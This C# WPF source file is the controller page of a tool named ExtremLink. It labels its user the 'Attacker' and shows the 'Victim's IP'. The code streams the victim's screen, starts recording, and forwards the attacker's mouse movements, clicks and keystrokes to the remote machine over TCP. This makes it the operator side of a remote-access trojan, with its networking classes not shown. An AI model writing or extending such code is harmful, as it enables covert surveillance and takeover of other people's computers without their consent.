using ExtremLink_Client_v2.Classes;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace ExtremLink_Client_v2.Pages
{
    /// <summary>
    /// Interaction logic for ControlPage.xaml
    /// </summary>
    public partial class ControlPage : UserControl
    {

        // Attirbutes:
        private ContentControl contentMain;

        private Session currentSession;
        private Thread recordingThread;

        private bool isReceivingFrames;

        public ControlPage(ContentControl contentMain)
        {
            this.contentMain = contentMain;
            this.isReceivingFrames = false;
            InitializeComponent();
            clientIpTextBlock.Text = $"Victim's IP: {Attacker.AttackerInstance.VictimIpAddr}";
        }

        private void PlayBtn_Click(object sender, RoutedEventArgs e)
        {
            Attacker.AttackerInstance.SendTCPMessageToClient("&", "StartSendFrames");
            this.isReceivingFrames = true;
            Thread.Sleep(3000);
            this.UpdateFrame();
        }
        private void PauseBtn_Click(object sender, RoutedEventArgs e)
        {
            Attacker.AttackerInstance.SendTCPMessageToClient("&", "PauseSendFrames");
        }
        private void StopBtn_Click(object sender, RoutedEventArgs e)
        {
            Attacker.AttackerInstance.SendTCPMessageToClient("&", "StopSendFrames");
        }
        private void RecordBtn_Click(object sender, RoutedEventArgs e)
        {
            Attacker.AttackerInstance.SendTCPMessageToClient("&", "StartRecord");
            this.recordingStatusTextBlock.Text = "Record: on"; 
        }


        // Frames functions:
        private BitmapImage LoadFrameFromFile()
        {
            string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;


            MessageBox.Show("1");
            // Note: Debug this line:
            string tempFramePath = System.IO.Path.Combine(baseDirectory, Attacker.AttackerInstance.TempPngFileName);
            MessageBox.Show("2");
            
            
            return Attacker.AttackerInstance.GetBitmapImageFromPNGFile(tempFramePath);
        }

        private async void UpdateFrame()
        {
            while (this.isReceivingFrames)
            {
                try
                {
                    if (Attacker.AttackerInstance.CurrentFrame != null)
                    {
                        BitmapImage tempFrame = this.LoadFrameFromFile();
                        await Dispatcher.InvokeAsync(() => frameImg.Source = tempFrame);
                    }
                    // Set the sleep function so the frame rate will be around ~30 FPS
                    await Task.Delay(32);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error updating frame: {ex.Message}");
                    isReceivingFrames = false;
                }
            }
        }


        // Mouse functions:
        private void FrameImg_MouseMove(object sender, MouseEventArgs e)
        {
            // Input: nothing
            // Output: The function updates the mouse's coordinates sends them the client as a query.
            if (this.isReceivingFrames)
            {
                CustomMouseAttacker.CustomMouseInstance.ChangePosition(e.GetPosition(frameImg));
                CustomMouseAttacker.CustomMouseInstance.SendMouseCommands(AttackerMouseCommands.Move);
            }
        }
        private void FrameImg_MouseDown(object sender, MouseButtonEventArgs e)
        {
            // Input: nothing
            // Output: The function sends the client as a query about pressing on one of the mouse buttons(left ot right).
            if (this.isReceivingFrames)
            {
                CustomMouseAttacker.CustomMouseInstance.ChangePosition(e.GetPosition(frameImg));
                if (e.ChangedButton == MouseButton.Left)
                {
                    CustomMouseAttacker.CustomMouseInstance.SendMouseCommands(AttackerMouseCommands.LeftPress);
                }
                if (e.ChangedButton == MouseButton.Right)
                {
                    CustomMouseAttacker.CustomMouseInstance.SendMouseCommands(AttackerMouseCommands.RightPress);
                }
            }
        }
        
        // Keyboard functions:
        private void FrameImg_KeyboardKeyDown(object sender, KeyEventArgs e)
        {
            // Input: Nothing.
            // Output: The function getting keyboard key and sending it to the client
            Key pressedKey = e.Key;
            CustomKeyboardAttacker.CustomKeyboardInstance.SendKeyboardCommands(pressedKey);
        }
    }
}
